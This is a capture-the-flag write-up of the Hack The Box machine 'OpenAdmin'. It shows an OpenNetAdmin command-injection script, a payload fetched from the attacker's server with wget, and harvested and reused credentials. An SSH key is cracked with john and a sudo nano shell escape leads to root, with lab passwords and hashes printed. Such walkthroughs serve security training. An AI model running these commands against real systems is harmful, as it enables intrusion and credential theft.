---
layout: post
title: "[HTB] OpenAdmin - write up"
published: true
date: 2020-04-30
description: OpenAdmin is an easy box and quite straight forwards. You first need to enumerate to find where the websites reside. Then, as a good practice, look at the cookies, which tells use what CMS, this site is using. We can then see that because the version is out of date we can easily get some RCE working from a known vulnerability. Then it's just a question of investigating what files are available and remembering that users often reuse passwords. The root is very easy if you get the fuck out.
img: posts/openadmin/logo_openadmin.png # Add image post (optional)
tags: [GTFO, ssh, php, Enumeration, CMS, OpenNetAdmin, Cookie, RCE, Linux, HTB, Easy] # add tag
os: Linux
difficulty: Easy
points: 20
release: 2020-01-04
ip: 10.10.10.171
---

# Summary:

{{ page.description }}

### Foothold:

```sh
$nmap -sV -sS -oA  nmap/openadmin 10.10.10.171
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-18 13:15 CET
Nmap scan report for 10.10.10.171
Host is up (0.26s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.43 seconds
```

We can see that there are 2 open ports `22/ssh` and `80/http`. We get information that this is an Ubuntu machine with the versions of Openssh and Apache.

Looking at the website, we can see a simple Apache default page. We need to `gobuster` this website. Let's try  dirb's common.txt wordlists.

```sh
$gobuster dir --url http://10.10.10.171 --wordlist /usr/share/dirb/wordlists/common.txt -o gobuster.default
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.171
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/03/18 13:34:24 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.hta (Status: 403)
/.htaccess (Status: 403)
/artwork (Status: 301)
/index.html (Status: 200)
/music (Status: 301)
/server-status (Status: 403)
===============================================================
2020/03/18 13:35:19 Finished
===============================================================
```

With the first scan, we can see two folders: `artwork` and `music`, let's check them out. Wow, these are good looking websites by `Colorlib`. Cool, but we cannot find anything else in terms of folders. We can however check the cookies and see if something stands out

<img src="{{site.baseurl}}/assets/img/posts/openadmin/1.png" alt="1" style="display: block;  margin-left: auto; margin-right: auto;" />

and indeed we have two `ONA` cookies. The first one has a path mentioned : `/ona`. Does that work in the URL? Yes, we have a dashboard `OpenNetAdmin` (Now I get the name of the box :) ). We can note two things:

- First we are logged in as guest. try to change to `admin:admin` does not work.
- Second, the version is not up to date.

<img src="{{site.baseurl}}/assets/img/posts/openadmin/2.png" alt="2" style="display: block;  margin-left: auto; margin-right: auto;" />

Looking online, we can see that `OpenNetAdmin` is vulnerable to Remote Command Execution described here [https://www.exploit-db.com/exploits/47691](https://www.exploit-db.com/exploits/47691). A bash script is provided where one needs to modify the URL, to our target:

```sh
$cat rce.sh
#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "http://10.10.10.171/ona/" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done

$sh rce.sh
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Running this scripts we get a elementary shell, we can easily upload a payload. In our case, we'll use `linspead.sh` to scan for any enumeration. To do that, we make a simple server on our host and wget to our target the file.

```sh
[LOCAL]
$python -m SimpleHTTPServer 8081
Serving HTTP on 0.0.0.0 port 8081 ...


[# ]ON TARGET]
$ wget http://10.10.14.126:8081/linpeas.sh
$ sh linpeas.sh > linpeas.out
[WAIT FOR FINISH]


[LOCAL]

$wget http://10.10.10.171/ona/linpeas.out
--2020-03-18 14:15:57--  http://10.10.10.171/ona/linpeas.out
Connecting to 10.10.10.171:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 191908 (187K)
Saving to: ‘linpeas.out’

linpeas.out                              100%[================================================================>] 187.41K   320KB/s    in 0.6s

2020-03-18 14:15:58 (320 KB/s) - ‘linpeas.out’ saved [191908/191908]
```

Before reading the `linpeas.out` let's check the `/home/` directory.

```sh
$ ls -al /home/
total 16
drwxr-xr-x  4 root   root   4096 Nov 22 18:00 .
drwxr-xr-x 24 root   root   4096 Nov 21 13:41 ..
drwxr-x---  5 jimmy  jimmy  4096 Nov 22 23:15 jimmy
drwxr-x---  6 joanna joanna 4096 Nov 28 09:37 joanna
```

Ok so we know which users available. Let's study the `linpeas.out` file now. Looking carefully at the result, we find a password:

```sh
$less -r linpeas.out

[...]
/var/www/ona/local/config/database_settings.inc.php:        'db_passwd' => 'n1nj4W4rri0R!',
[...]
```

Great, let's look at the database php file to on the host to get the rest.

```php
$ cat /var/www/ona/local/config/database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' =>
  array (
    'databases' =>
    array (
      0 =>
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

Cool, we got some creds: `ona_sys:n1nj4W4rri0R!`. Unfortunately, I cannot log on the `OpenNetAdmin` with this. And I cannot find the database. What we can do though is see if `jimmy` or `joanna` have reused the password. and the answer is...

```sh
$ssh jimmy@10.10.10.171
jimmy@10.10.10.171's password: n1nj4W4rri0R!
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Mar 18 13:27:17 UTC 2020

  System load:  0.07              Processes:             124
  Usage of /:   49.3% of 7.81GB   Users logged in:       1
  Memory usage: 28%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Mar 18 13:24:45 2020 from 10.10.14.115
jimmy@openadmin:~$
```

YES ! We can ssh with `jimmy`. We are restricted on this user. Looking at `sudo -l` shows that we cannot use sudo at all. We can try to find files that are owned by jimmy.

# User

```sh
jimmy@openadmin:~$ find / -user jimmy

/var/www/internal
/var/www/internal/main.php
/var/www/internal/logout.php
/var/www/internal/index.php
/home/jimmy
/home/jimmy/.local
/home/jimmy/.local/share
/home/jimmy/.local/share/nano
/home/jimmy/.local/share/nano/search_history
/home/jimmy/.bashrc
/home/jimmy/.cache
/home/jimmy/.cache/motd.legal-displayed
/home/jimmy/.profile
/home/jimmy/.gnupg
/home/jimmy/.gnupg/private-keys-v1.d
/home/jimmy/.bash_history
/home/jimmy/.bash_logout
```

Apart from the `/proc/` we own the files in `/home/jimmy` and also in `/var/www/internal`. That's interesting. We cannot access these files with the browser.

```sh
jimmy@openadmin:/var/www/internal$ ls -al
total 20
drwxrwx--- 2 jimmy internal 4096 Nov 23 17:43 .
drwxr-xr-x 4 root  root     4096 Nov 22 18:15 ..
-rwxrwxr-x 1 jimmy internal 3229 Nov 22 23:24 index.php
-rwxrwxr-x 1 jimmy internal  185 Nov 23 16:37 logout.php
-rwxrwxr-x 1 jimmy internal  339 Nov 23 17:40 main.php
```

Let's look at all three files

```php
jimmy@openadmin:/var/www/internal$ cat index.php
<?php
   ob_start();
   session_start();
?>

<?
   // error_reporting(E_ALL);
   // ini_set("display_errors", 1);
?>

<html lang = "en">

   <head>
      <title>Tutorialspoint.com</title>
      <link href = "css/bootstrap.min.css" rel = "stylesheet">

      <style></style>

   </head>
   <body>

      <h2>Enter Username and Password</h2>
      <div class = "container form-signin">
        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
          <?php
            $msg = '';

            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
         ?>
      </div> <!-- /container -->

      <div class = "container">

         <form class = "form-signin" role = "form"
            action = "<?php echo htmlspecialchars($_SERVER['PHP_SELF']);
            ?>" method = "post">
            <h4 class = "form-signin-heading"><?php echo $msg; ?></h4>
            <input type = "text" class = "form-control"
               name = "username"
               required autofocus></br>
            <input type = "password" class = "form-control"
               name = "password" required>
            <button class = "btn btn-lg btn-primary btn-block" type = "submit"
               name = "login">Login</button>
         </form>

      </div>

   </body>
</html>
```

Ok so `index.php` is a login form. However, the verification is done in the script, so the key is shown in sha512. We can look online [https://md5hashing.net/hash/sha512](https://md5hashing.net/hash/sha512) to see if it is known. And after a minute, we see that the creds are `jimmy:Reveals`.


```php
jimmy@openadmin:/var/www/internal$ cat main.php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); };
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

and `main.php` is the login page. We see that this page actually runs some code to print joanna's id_rsa. So we need to run this code. However, we cannot access it from the browser. I tried running a small php server from ssh, but `jimmy` does not have the privilege to `cat` the ssh key. What we can do though is see if there is a server running locally ?

```sh
jimmy@openadmin:/var/www/internal$ netstat -l
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 localhost:domain        0.0.0.0:* LISTEN
tcp        0      0 0.0.0.0:ssh             0.0.0.0:* LISTEN
tcp        0      0 localhost:mysql         0.0.0.0:* LISTEN
tcp        0      0 localhost:52846         0.0.0.0:* LISTEN
tcp6       0      0 [::]:ssh                [::]:*    LISTEN
tcp6       0      0 [::]:http               [::]:*    LISTEN
udp        0      0 localhost:domain        0.0.0.0:*
```

There is indeed something on `localhost:52846`, We cannot access that with our browser, but we can from `ssh` with `curl`. Knowing the php scripts, we can try and directly login

```sh
jimmy@openadmin:/var/www/internal$ curl  -X POST -F 'username=jimmy' -F 'password=Revealed'  localhost:52846/main.php
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

Yes! we got a rsa private key. We need to crack that. Let's ask `john`. What we do is copy this key to a file on our host. First we need to convert that to `john` compatible. We locate `ssh2john` and pipe the result to another file, and then run `john` with `rockyou`

```sh
$locate ssh2john
/usr/share/john/ssh2john.py

$usr/share/john/ssh2john.py joanna.priv > joanna.priv.john

$/usr/sbin/john joanna.priv.john -wordlist=rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 6 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (joanna.priv)
1g 0:00:00:14 DONE (2020-03-18 14:47) 0.06963g/s 998725p/s 998725c/s 998725C/s     1111..*7¡Vamos!
Session completed
```

SUCCESS! we got a password `joanna:bloodninjas`. We can try to `ssh` with `joanna` using this password, and rsa key.

```sh
$ssh -i ./joanna.priv joanna@10.10.10.171
Enter passphrase for key './joanna.priv':
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Mar 18 13:51:21 UTC 2020

  System load:  0.0               Processes:             118
  Usage of /:   49.6% of 7.81GB   Users logged in:       1
  Memory usage: 18%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Jan  2 21:12:40 2020 from 10.10.14.3
joanna@openadmin:~$ id
uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
joanna@openadmin:~$ cat user.txt
c9b2cf07d40807e62af62660f0c81b5f
```
Great we got user.txt !

# Root

First we can see if `joanna` has any `sudo` privs

```sh
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

Looking at `sudo -l` we have an opening with `nano` -> GTFO :)

```sh
#~/Git/gtfo/gtfo -b nano
   _  _           _    __
 _| || |_        | |  / _|
|_  __  _|   __ _| |_| |_ ___
 _| || |_   / _` | __|  _/ _ \
|_  __  _| | (_| | |_| || (_) |
  |_||_|    \__, |\__|_| \___/
             __/ |
            |___/

[...]

Code:	sudo nano
	^R^X
	reset; sh 1>&0 2>&0

Type:	sudo

```

There is a way in with `nano`. So let's get in

```sh
joanna@openadmin:~$ sudo /bin/nano /opt/priv
```

Then we type `ctrl+r` and `ctrl+x` and we can run the command in `nano`: `reset; sh 1>&0 2>&0`. We see a small `#` at the bottom. We can type `clear` to get a clean terminal.

and we got root !

```sh
# bash
root@openadmin:~# id
uid=0(root) gid=0(root) groups=0(root)
root@openadmin:~# cd /root
root@openadmin:/root# cat root.txt
2f907ed450b361b2c2bf4e8795d5b561
```


**Guanicoe**

| name | hash |
| ------------- |:-------------:| -----:|
| root | $6$BGk6CBPE$FoDCUgY.1pnYDkqDr4.yNm4jQqnnG7side9P6ApdQWWqLr6t1DHq/iXuNF7F0fkivSYXajUp/bK2cw/D/3ubU/:18222:0:99999:7::: |
| jimmy  | $6$XnCB2K/6$QALmpgLWhDwUjcNldzgtafb6Tt1dT.uyIfxdhDYOVGdlNgIyDX89hz29P.aDQM9OBSSsI2dJGUYYTmQtdb2zw.:18222:0:99999:7::: |
| joanna | $6$gmFfLksM$XJl08bIFRUki/Lecq8RKFzFFvleGn9CjiqrQxU4n/l6JZe/FSRbe0I/W3L86yWibCJejfrMzgH3HvUezxhCWI0:18222:0:99999:7::: |
